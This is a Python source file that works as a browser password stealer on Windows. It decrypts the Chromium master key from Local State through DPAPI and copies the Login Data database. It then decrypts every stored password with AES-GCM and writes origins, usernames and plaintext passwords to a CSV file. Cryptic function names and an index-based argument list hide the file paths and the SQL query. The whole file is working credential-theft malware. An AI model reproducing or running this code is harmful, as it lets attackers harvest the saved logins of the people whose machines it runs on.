import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv


def gk(lsp):
    with open(lsp, "r", encoding="utf-8") as f:
        l = json.loads(f.read())
    k = base64.b64decode(l["os_crypt"]["encrypted_key"])
    k = k[5:]
    return win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]


def dp(p, k):
    try:
        iv = p[3:15]
        p = p[15:]
        c = AES.new(k, AES.MODE_GCM, iv)
        return c.decrypt(p)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(p, None, None, None, 0)[1])
        except:
            return ""


def main(v):
    k = gk(os.path.join(os.getenv(v[8]), v[9]))
    dbp = os.path.join(os.getenv(v[8]), v[11], v[3])
    shutil.copyfile(os.path.join(os.getenv(v[8]), v[10]), dbp)
    db = sqlite3.connect(dbp)
    c = db.cursor().execute(v[12])
    d = []
    for r in c.fetchall():
        if r[2]:
            d.append([r[0], r[1], r[2], dp(r[3], k)])
    c.close()
    db.close()
    os.remove(dbp)
    dbp += 's'
    if os.path.exists(dbp):
        os.remove(dbp)
    with open(dbp, 'w', newline='', encoding='utf-8') as c:
        cw = csv.writer(c)
        cw.writerow(['o', 'a', 'u', 'p'])
        cw.writerows(d)
    return dbp
